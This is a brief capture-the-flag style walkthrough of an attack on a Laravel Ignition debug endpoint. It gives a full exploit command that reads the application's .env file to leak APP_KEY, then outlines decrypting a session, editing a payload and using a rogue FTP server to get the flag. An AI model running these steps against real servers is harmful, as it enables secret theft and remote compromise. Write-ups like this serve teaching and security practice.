
# Step 1

Get APP_KEY

```
python filters_chain_oracle_exploit.py --target "https://csgo.teklab.one/_ignition/execute-solution?solution=Facade\Ignition\Solutions\MakeViewVariableOptionalSolution" --file /var/www/app/.env --parameter cc --verb JSONPOST --proxy http://127.0.0.1:8080
```

# Step 2

Replace the leaked APP_KEY and session value then decrypt to find the session id


```
python decrypt.py
```

# Step 3

Change the session id in `payload.bin`

# Step 4

Run evil ftp server and trigger the ftp client to this server

-> Refresh the page and the flag will turn out